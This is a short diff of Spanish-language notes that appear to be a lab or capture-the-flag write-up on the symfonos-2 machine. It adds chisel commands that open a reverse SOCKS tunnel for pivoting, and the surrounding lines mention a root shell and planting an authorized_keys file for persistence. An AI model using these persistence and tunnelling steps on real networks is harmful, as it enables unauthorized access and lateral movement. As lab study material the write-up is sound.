@@ -483,6 +483,14 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 #Nota: hacemos una copia de nuestra `authorized_keys` en la maquina `symfonos-2` para de esta manera asegurar la persistencia y así poder salir y entrar cuando queramos
 ![[Pasted image 20240619174131.png]]
 
+# CONEXIÓN
 
+```python
+❯ ./chisel server --reverse -p 8000
+
+> ./chisel client 10.0.2.4:8000 R:socks
+
+
+```
 
 [GraficoPivoting](obsidian://open?vault=ObsidianGIT&file=Excalidraw%2FPivoting.excalidraw) 
